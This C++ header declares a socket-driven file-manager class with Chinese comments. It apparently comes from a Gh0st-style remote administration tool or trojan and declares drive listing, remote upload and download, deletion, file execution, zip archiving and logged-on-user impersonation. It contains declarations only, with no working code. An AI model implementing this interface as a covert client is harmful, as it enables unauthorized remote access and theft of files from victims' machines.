// FileManager.h: interface for the CFileManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_FILEMANAGER_H__359D0039_E61F_46D6_86D6_A405E998FB47__INCLUDED_)
#define AFX_FILEMANAGER_H__359D0039_E61F_46D6_86D6_A405E998FB47__INCLUDED_
#include <winsock2.h>
#include "FileFinder.h"
#include "Wit.h"
#include <list>
#include <string>
#include "Manager.h"
using namespace std;
#include <vector>
// 在类声明前添加结构体前向声明或完整定义  
struct ZipCentralDirEntry;  

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

typedef struct 
{
	UINT	nFileSize;	// 文件大小
	UINT	nSendSize;	// 已发送大小
}SENDFILEPROGRESS, *PSENDFILEPROGRESS;


class CFileManager : public CManager
{
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
	UINT SendDriveList();
	CFileManager(CClientSocket *pClient);
	virtual ~CFileManager();
private:
	bool CreateZipArchive(const CString& inputPath, const CString& outputPath);  
    bool CompressFile(FILE* zipFile, const CString& filePath, const CString& relativePath,   
		std::vector<ZipCentralDirEntry>& centralDir, std::vector<CString>& filenames, DWORD& offset);  
    bool CompressDirectory(FILE* zipFile, const CString& dirPath, const CString& relativePath,  
		std::vector<ZipCentralDirEntry>& centralDir, std::vector<CString>& filenames, DWORD& offset);  
    void WriteCentralDirectory(FILE* zipFile, const std::vector<ZipCentralDirEntry>& centralDir,   
                              const std::vector<CString>& filenames, DWORD offset);
	list <string> m_UploadList;
	BOOL m_bIsWow64;
	UINT m_nTransferMode;
	HANDLE m_hFileSend;
	HANDLE m_hFileRecv;
	char m_strCurrentProcessFileName[MAX_PATH]; // 当前正在处理的文件
	__int64 m_nCurrentProcessFileLength; // 当前正在处理的文件的长度
	HANDLE ImpersonateLoggedOnUserWrapper();
	bool MakeSureDirectoryPathExists(LPCTSTR pszDirPath);
	bool UploadToRemote(LPBYTE lpBuffer);
	bool FixedUploadList(LPCTSTR lpszDirectory);
	void StopTransfer(BOOL bIsUpload);
	UINT SendFilesList(LPCTSTR lpszDirectory);
	bool DeleteDirectory(LPCTSTR lpszDirectory);
	UINT SendFileSize(LPCTSTR lpszFileName);
	UINT SendFileData(LPBYTE lpBuffer);
	void CreateFolder(LPBYTE lpBuffer);
	void Rename(LPBYTE lpBuffer);
	int	 SendToken(BYTE bToken);

	void CreateLocalRecvFile(LPBYTE lpBuffer);
	void SetTransferMode(LPBYTE lpBuffer);
	void GetFileData();
	void WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize);
	void UploadNext();
	bool OpenFile(LPCTSTR lpFile, INT nShowCmd);
	void ExeCompress(BYTE* lpBuffer);
    void SearchFile(LPBYTE lpBuffer);
protected:
	static void FileFinderProc(CFileFinder *pFinder, DWORD dwCode, void *pCustomParam);
};

#endif // !defined(AFX_FILEMANAGER_H__359D0039_E61F_46D6_86D6_A405E998FB47__INCLUDED_)
